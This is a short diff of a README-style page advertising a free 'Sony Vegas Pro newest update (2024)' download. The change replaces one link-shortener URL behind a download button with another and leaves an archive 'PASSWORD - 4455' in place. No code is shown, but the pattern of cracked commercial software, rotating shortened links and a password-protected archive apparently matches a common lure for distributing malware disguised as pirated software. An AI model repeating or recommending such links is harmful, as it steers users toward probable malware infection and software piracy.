@@ -1,6 +1,6 @@
 # <h1 align=center> SONY VEGAS PRO -NEWEST UPDATE SOFTWARE! (2024)
 
-<h2 align=center><a href='https://freeclickr.cc/1zsbo3'><img src='https://cdn.discordapp.com/attachments/1160267814955921539/1166494337333477508/dl.gif?ex=654ab182&is=65383c82&hm=4471195e7bcf5ada053994b147afa3028c86e8e30da2279d0df4a9c90757860c&'></a></h2>
+<h2 align=center><a href='https://thetinyengine.world/oqDZPe'><img src='https://cdn.discordapp.com/attachments/1160267814955921539/1166494337333477508/dl.gif?ex=654ab182&is=65383c82&hm=4471195e7bcf5ada053994b147afa3028c86e8e30da2279d0df4a9c90757860c&'></a></h2>
 
 <h1 align=center> 🗝PASSWORD🗝 - 4455
 
